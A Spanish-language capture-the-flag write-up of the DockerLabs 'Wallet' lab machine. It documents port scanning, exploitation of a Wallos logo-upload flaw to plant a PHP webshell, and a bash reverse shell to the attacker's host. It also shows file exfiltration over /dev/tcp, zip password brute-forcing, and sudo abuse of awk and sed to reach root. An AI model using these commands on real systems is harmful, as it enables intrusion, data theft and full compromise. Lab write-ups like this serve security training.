# WALLET - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Wallet. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./wallet.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: medio
- Sistema Operativo: linux
- Autor: Pylon y El Pingüino de Mario

## ESQUEMA

![wallet](https://github.com/user-attachments/assets/ac0ac6c5-7d41-48ba-82ce-f95cc166bff1)

## RECONOCIMIENTO DE RED

### conectividad y SO

Antes de empezar con el escaneo de puertos, comprobamos que tenemos conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/45e9f5a5-2ba6-48f6-9967-019ade5b7247)

Vemos que nos llega respuesta. Como el TTL es 64, la máquina seguramente use Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/4c80ace4-59e6-47cd-a7f9-19c311824c94)

#### puertos abiertos

**80 - TCP - HTTP**

Ahora sobre el puerto 80 hacemos otro escaneo de versiones y servicios con nmap:

```python
nmap -p80 -sCV 172.17.0.2 -oN targeted
```

> `-p80` hacer el escaneo solo sobre el puerto 80

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/ebcdcca0-a778-4055-a1cd-1fdcfb8bbf7f)

## RECONOCIMIENTO WEB

Cargamos el puerto 80 en el navegador:

![image](https://github.com/user-attachments/assets/d4789a62-5b82-4021-8259-9451e46f1ef7)

Vemos esta web. Si clicamos en el botón "get a quote" nos redirige a panel.wallet.dl. Para poder acceder a este subdominio, añadimos está línea al archivo `/etc/hosts`:

```python
<IP de la máquina> panel.wallet.dl
```

Y probamos a cargar el subdominio otra vez:

![image](https://github.com/user-attachments/assets/374a5020-2c62-4173-893a-9d7ec155706f)

Vemos un panel de registro. Nos creamos una cuenta, por ejemplo test:123 y nos logueamos.

![image](https://github.com/user-attachments/assets/2b0c94cc-d1df-472f-9d47-6607f8783f71)

Entramos en este panel. Como arriba pone Wallos, probamos a ejecutar `searchsploit wallos` para ver si esta tecnología tiene alguna vulnerabilidad conocida:

![image](https://github.com/user-attachments/assets/5129e5a3-d8b0-4773-b03b-dd916a5993b6)

Hay una vulnerabilidad de RCE. Para ver con detalle de que trata la vulnerabilidad, leemos el archivo de texto: `searchsploit -x php/webapps/51924.txt`. Pone que se trata de una vulnerabilidad en la subida de un logo al crear una nueva suscripción. Si bajamos vemos como cambia el logo por un código malicioso PHP:

![image](https://github.com/user-attachments/assets/5129e5a3-d8b0-4773-b03b-dd916a5993b6)

## INTRUSIÓN

Así que para explotar esta vulnerabilidad, nos vamos a nuestro panel, le damos a "Add first suscription" y ponemos cualquier cosa, pero interceptamos la petición con BurpSuite:

![image](https://github.com/user-attachments/assets/5f01952d-915a-4525-a3f5-f83437656607)

En la parte del logo ponemos el código PHP para ganar el RCE y le damos a forward. Vemos que en el archivo en el que explica la vulnerabilidad pone que los logos se guardan en http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php, así que vamos a http://panel.wallet.dl/images/uploads/logos/:

![image](https://github.com/user-attachments/assets/dde5b191-b723-417e-a0f1-a46c732fa238)

Cargamos el archivo PHP y probamos a ejecutar el comando `id`:

![image](https://github.com/user-attachments/assets/48ff6a0c-ea65-4cf8-a2d2-d6286ff339ce)

Vemos que funciona. Ahora nos ponemos en escucha por el puerto 443 con netcat:

```python
nc -nlvp 443
```

Y ejecutamos este comando desde la Webshell:

```python
/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

![image](https://github.com/user-attachments/assets/6acf4108-273e-450a-ae07-40a0af17dabc)

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS

### pylon

Siendo el usuario www-data, ejecutamos `sudo -l`:

![image](https://github.com/user-attachments/assets/df9001a8-e6d7-4f24-9c8e-31eaedc85cf2)

Podemos ejecutar como el usuario pylon, sin poner contraseña, el binario `/usr/bin/awk`. Buscamos en gtfobins.github.io:

![image](https://github.com/user-attachments/assets/e46f2124-64eb-42bb-9656-9bda046904eb)

Así que para ejecutar una bash como el usuario pylon hacemos:

```python
sudo -u pylon awk 'BEGIN {system("/bin/bash")}'
```

![image](https://github.com/user-attachments/assets/b0a26293-3a3d-4c58-a939-12d6968882cd)

### pinguino

Siendo el usuario pylon, si ejecutamos `sudo -l` nos pide contraseña, pero no la sabemos. Si vamos a `/home/pylon` vemos un archivo zip:

![image](https://github.com/user-attachments/assets/219ee695-a354-4865-a536-cb4616ca7356)

El archivo está protegido por contraseña. Podemos intentar hacer fuerza bruta de contraseñas, con [PinguZip](https://github.com/Maalfer/PinguZip) o [Zip_Bruteforce](https://github.com/4bytess/zip_bruteforce). Podemos o bien copiar el código de la herramienta que vayamos a usar y pegarla en un archivo dentro de la máquina víctima, o trasladarla a nuestra máquina local.

Si quremos trasladarla, como no está python3 instalado en la máquina víctima, no podremos montar un servidor HTTP. Se puede usar esta alternativa:

Ejecutar este comando en local:

```python
nc -nlvp 9090 > secretitotraviesito.zip
```

Ejecutar este comando en la máquina víctima:

```python
cat < secretitotraviesito.zip > /dev/tcp/172.17.0.1/9090
```

Ahora ya tenemos el zip en nuestra máquina y podemos hacer fuerza bruta más cómodamente.

```python
zip_bruteforce.sh /usr/share/wordlists/rockyou.txt secretitotraviesito.zip
```

![image](https://github.com/user-attachments/assets/00f8b502-8185-40c3-bcb2-12339e7dc54b)

Vemos que la contraseña es chocolate1. Descomprimimos el zip con la herramienta `unzip` y se nos crea un archivo de texto llamado notitachingona.txt:

![image](https://github.com/user-attachments/assets/5662c6ee-4f3a-4dba-8eee-f5fa45c4d644)

Contiene las credenciales del usuario pinguino.

### root

Ejecutamos `sudo -l` como el usuario pinguino:

![image](https://github.com/user-attachments/assets/57faf573-d602-42d4-8992-d573c33a67da)

Podemos ejecutar como cualquier usuario el binario `/usr/bin/sed`. Volvemos a gtfobins.github.io:

![image](https://github.com/user-attachments/assets/7fbf44b0-0770-40fa-81e6-61d1dce83e7f)

Ejecutamos el comando:

```python
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

![image](https://github.com/user-attachments/assets/f88ab75e-3ab4-4edf-a604-c1e50bf0d012)

Y ganamos una consola como root.